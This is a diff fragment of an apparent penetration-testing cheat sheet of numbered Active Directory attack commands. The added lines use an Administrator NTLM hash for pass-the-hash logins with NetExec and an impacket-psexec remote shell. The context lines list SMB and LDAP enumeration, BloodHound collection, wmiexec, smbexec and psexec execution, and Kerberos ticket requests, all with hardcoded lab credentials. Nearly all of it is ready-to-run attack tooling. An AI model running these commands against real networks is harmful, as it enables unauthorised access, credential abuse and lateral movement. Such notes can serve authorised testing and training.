@@ -220,6 +220,7 @@ enum4linux -a target                  # Enumerate shares/users 🔍
 26. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --shares
 27. nxc smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local --users
 28. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --groups
+00. nxc smb 192.168.159.127 -u Administrator -H '0f05fa36dc8659611b411796c9b0bfbf' --local-auth
 00. nxc ldap 192.168.159.129 -u schoudhari -p 'Sch0udhari123' --users
 29. nxc ldap 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d FAKEORG.LOCAL --bloodhound -c All --dns-server 192.168.1.100 --verbose
 30. nxc ldap 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d FAKEORG.LOCAL --bloodhound -c All --dns-server 192.168.1.100 --verbose
@@ -328,6 +329,7 @@ enum4linux -a target                  # Enumerate shares/users 🔍
 119. impacket-wmiexec fakeorg.local/john.doe:Passw0rd123!@192.168.1.100 "whoami"
 120. impacket-smbexec fakeorg.local/jane.smith:SecurePass456@@192.168.1.100
 121. impacket-psexec fakeorg.local/john.doe:Passw0rd123!@192.168.1.100
+000. impacket-psexec -hashes :0f05fa36dc8659611b411796c9b0bfbf CLIENT-1/Administrator@192.168.159.127
 122. impacket-rpcdump 192.168.1.100
 123. impacket-getTGT fakeorg.local/jane.smith:SecurePass456@
 124. impacket-getST -spn cifs/dc01.fakeorg.local fakeorg.local/john.doe:Passw0rd123! -dc-ip 192.168.1.100
